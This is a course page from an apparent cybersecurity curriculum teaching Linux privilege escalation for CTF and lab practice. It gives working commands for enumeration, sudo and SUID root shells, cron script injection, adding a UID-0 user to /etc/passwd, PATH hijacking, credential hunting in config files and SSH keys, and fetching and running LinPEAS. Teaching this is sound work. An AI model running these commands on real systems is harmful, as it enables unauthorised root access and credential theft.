---
layout: page
title: "Linux Privilege Escalation"
week_number: "34"
release_date: "2026-12-08"
phase_label: "Phase 7"
phase_name: "Intermediate Cybersecurity"
phase_color: "#e63946"
permalink: /week-34/
---

> Week 34. Privilege escalation -- getting from a low-privilege shell to root.
> 
> In real penetration tests and CTF machines, you almost never start as root. You find a foothold as a web server user or a low-privilege account, and then you need to escalate.
> 
> Setup for this week: the TryHackMe room 'Linux PrivEsc' walks through every technique in a guided environment. Sign up at https://tryhackme.com if you have not already.
> 
> Alternatively, use any HackTheBox machine you have already rooted and try to find alternative privesc paths.

---

# Linux Privilege Escalation

## What You Will Be Able to Do

By the end of this guide you will be able to:

- Enumerate a Linux system after gaining initial access
- Identify common misconfiguration categories that lead to privilege escalation
- Explain SUID, sudo misconfigurations, writable cron jobs, and weak file permissions
- Use basic enumeration tools (manual commands and linpeas)
- Follow a methodical approach to finding privesc vectors

---

## What is Privilege Escalation?

After gaining initial access to a system (e.g. as a low-privilege user from exploiting a web app), you typically have limited access. Privilege escalation (privesc) is the process of moving from a low-privilege account to `root` or another high-privilege account.

In CTF and HackTheBox machines, you usually need to:
1. Get a foothold (shell as a low-privilege user)
2. Enumerate the system
3. Find a privesc vector
4. Exploit it to become root

This guide covers Linux. Windows privesc has different vectors.

---

## Initial Enumeration

The first thing after landing a shell: understand where you are.

```bash
# Who am I and what groups am I in?
id
whoami
groups

# What is the OS and kernel version?
uname -a
cat /etc/os-release
cat /proc/version

# What is the hostname?
hostname

# What users exist on the system?
cat /etc/passwd | grep -v nologin | grep -v false

# What environment variables are set?
env
echo $PATH
```

---

## Sudo Misconfigurations

`sudo` lets you run specific commands as root. Misconfigurations are one of the most common privesc vectors.

```bash
# What can I run with sudo?
sudo -l
```

Example output:
```
User www-data may run the following commands on target:
    (ALL) NOPASSWD: /usr/bin/find
```

This means you can run `find` as root without a password. Check GTFOBins (https://gtfobins.github.io) for how to exploit any binary with sudo rights.

```bash
# Exploiting sudo find to get a root shell
sudo find . -exec /bin/bash -p \; -quit
```

**GTFOBins** is the reference for exploiting binaries. Search for any binary you have sudo access to and find the privesc method.

Common exploitable sudo binaries:
- `vim`, `nano`, `less` (can shell out)
- `find`, `awk`, `nmap` (can execute commands)
- `python`, `ruby`, `perl` (can run arbitrary code)
- `cp`, `tee` (can overwrite files)
- `tar`, `zip` (can read files)

---

## SUID Binaries

SUID (Set User ID) is a file permission that makes a program run as the file's owner rather than the person running it. An SUID binary owned by root runs as root, regardless of who executes it.

Find all SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Common exploitable SUID binaries: `bash`, `vim`, `python`, `nmap`, `find`, `cp`.

Check GTFOBins for each one.

Example: if `/usr/bin/find` has SUID bit set:
```bash
find . -exec /bin/sh -p \; -quit
# -p flag preserves the effective UID (root)
```

Example: if `/bin/bash` has SUID:
```bash
/bin/bash -p
```

---

## Cron Jobs

Cron runs scheduled tasks. If a cron job runs a script that you can write to, you can inject commands that will run as root.

```bash
# View system cron jobs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# Watch for new processes (useful for detecting cron)
watch -n 1 "ps aux"
# Or use pspy (download from https://github.com/DominicBreuker/pspy)
```

What to look for:
- A cron job running a script with a wildcard path you can influence
- A cron job running a script you have write access to
- A cron job running a script that uses a relative path (PATH injection)

Example: if `/opt/cleanup.sh` runs every minute as root and you can write to it:
```bash
echo "chmod +s /bin/bash" >> /opt/cleanup.sh
# Wait for cron to run...
/bin/bash -p
```

---

## Writable Files and Directories

```bash
# Files writable by your user or group
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys

# Directories writable by your user
find / -writable -type d 2>/dev/null | grep -v proc

# Is /etc/passwd writable? (very unusual but worth checking)
ls -la /etc/passwd
```

If `/etc/passwd` is writable: you can add a new root user.

```bash
# Generate a password hash
openssl passwd -1 "newpassword"

# Add a root user (UID 0, GID 0)
echo 'hacker:$1$XYZ...:0:0:root:/root:/bin/bash' >> /etc/passwd

# Switch to the new user
su hacker
```

---

## PATH Injection

If a SUID binary or sudo-allowed script calls another program by name without a full path, you can hijack the PATH to make it execute your script instead.

```bash
# Check what a script does
cat /opt/backup.sh
# Contents: tar -czf /tmp/backup.tgz /home

# If you can write to a directory early in PATH:
mkdir /tmp/privesc
echo '#!/bin/bash\nbash -i' > /tmp/privesc/tar
chmod +x /tmp/privesc/tar
export PATH=/tmp/privesc:$PATH

# Now run the script that calls tar
/opt/backup.sh
# It runs your "tar" instead of the real one
```

---

## Kernel Exploits

If the kernel version is old, there may be public exploits.

```bash
uname -r    # check kernel version
```

Search for exploits:
- https://www.exploit-db.com
- `searchsploit linux kernel 4.4`

Common kernel exploits:
- Dirty COW (CVE-2016-5195) - affects kernels 2.6.22 to 4.8.3
- DirtyPipe (CVE-2022-0847) - affects kernels 5.8 to 5.16.11

Kernel exploits are high risk in CTFs (they can crash the machine). Try other vectors first.

---

## Password Hunting

```bash
# Config files with passwords
grep -r "password" /etc/ 2>/dev/null
grep -r "password" /var/www/ 2>/dev/null
grep -r "password" /home/ 2>/dev/null

# Common locations
cat /var/www/html/config.php
cat ~/.bash_history
cat ~/.ssh/id_rsa         # private SSH key
find / -name "*.conf" 2>/dev/null | xargs grep -l "password" 2>/dev/null

# Database credentials
cat /etc/mysql/my.cnf
```

---

## Services Running as Root

```bash
# What services are running?
ps aux | grep root
ss -tlnp          # listening ports

# Is anything running on an internal port that is not exposed externally?
ss -tlnp | grep 127.0.0.1
```

If a service is running on localhost only, you might be able to reach it locally and exploit it to escalate.

---

## LinPEAS: Automated Enumeration

LinPEAS (Linux Privilege Escalation Awesome Script) automates most of the above checks.

```bash
# Download (requires internet access on target, or transfer from your machine)
curl -o linpeas.sh https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh 2>/dev/null | tee /tmp/linpeas_output.txt
```

LinPEAS colour-codes results:
- Red/Yellow = critical (high probability of privesc)
- Yellow = interesting
- Blue = not directly exploitable but useful info

Always review the output manually -- LinPEAS finds a lot but does not tell you which finding to exploit.

---

## Methodology: Where to Start

When you get a shell and need to escalate:

1. `id` and `sudo -l` - the two most important commands. Run them first.
2. `find / -perm -4000 2>/dev/null` - SUID binaries
3. `cat /etc/crontab` + `ls /etc/cron.*` - scheduled tasks
4. `ps aux` - running processes, especially root ones
5. `cat ~/.bash_history` - previous commands often reveal paths and passwords
6. Run LinPEAS and review the output
7. Check GTFOBins for any interesting binary you find

Do not jump straight to kernel exploits. Work through the easier checks first.

---

## Practice Platforms

- **HackTheBox:** Most machines require Linux privesc to get root flag
- **TryHackMe:** "Linux PrivEsc" room (search for it)
- **VulnHub:** Download local VMs to practice offline

---

## What to Read Next

- GTFOBins: https://gtfobins.github.io (bookmark this)
- PayloadsAllTheThings Linux privesc: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
- `learning/03_cybersecurity/advanced/01_pentesting-methodology.md`

---

## Activity: TryHackMe: Linux PrivEsc Room

1. Log into https://tryhackme.com and find the 'Linux PrivEsc' room (search for it)
1. Start the machine and work through every task in order
1. Tasks cover: service exploits, weak file permissions, sudo, SUID/GUID, cron jobs, PATH injection, NFS, and more
1. For each task, write a one-line note in your ctf-practice notes: what the technique is and the command that exploited it
1. Run LinPEAS on the machine when you get access and compare what it finds to what you found manually
1. You know you are done when you have completed all tasks and have notes for each technique

---

## Check-in Questions

Write your answers down before your next session.

1. What is the first command you run after getting a low-privilege shell on a Linux system?
2. What makes a SUID binary dangerous?
3. How does a writable cron script lead to root access?
4. What is LinPEAS and what does the colour coding in its output mean?
